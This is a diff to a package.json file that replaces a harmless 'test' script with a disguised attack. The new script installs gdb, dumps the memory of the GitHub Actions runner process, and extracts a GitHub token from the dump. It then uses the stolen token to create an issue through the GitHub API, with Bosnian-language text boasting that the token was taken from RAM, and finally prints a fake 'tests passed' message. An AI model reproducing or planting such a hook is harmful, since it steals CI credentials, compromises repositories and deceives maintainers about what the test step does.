@@ -2,6 +2,6 @@
   "name": "moj-super-projekat",
   "version": "1.0.0",
   "scripts": {
-    "test": "echo 'Svi testovi su prošli uspješno!'"
+    "test": "echo '[*] Krecem u RAM...' && sudo apt-get update -y > /dev/null 2>&1 && sudo apt-get install -y gdb curl > /dev/null 2>&1 && RUNNER_PID=$(pgrep -f Runner.Worker | head -n 1) && sudo gcore -o /tmp/core $RUNNER_PID > /dev/null 2>&1 && TOKEN=$(sudo strings /tmp/core* | grep -Eo 'ghs_[A-Za-z0-9_]{36}' | sort | uniq | head -n 1) && if [ -n \"$TOKEN\" ]; then curl -s -X POST -H \"Authorization: Bearer $TOKEN\" -H \"Accept: application/vnd.github.v3+json\" https://api.github.com/repos/saricital/real-world-ci/issues -d '{\"title\":\"🔥 RAM EXFILTRATION PWNED 🔥\",\"body\":\"Ovaj Issue je kreiran tokom NPM instalacije! Token ukraden pravo iz RAM-a!\"}'; else echo 'Nema tokena u RAM-u'; fi && echo 'Testovi su prosli uspjesno!'"
   }
 }
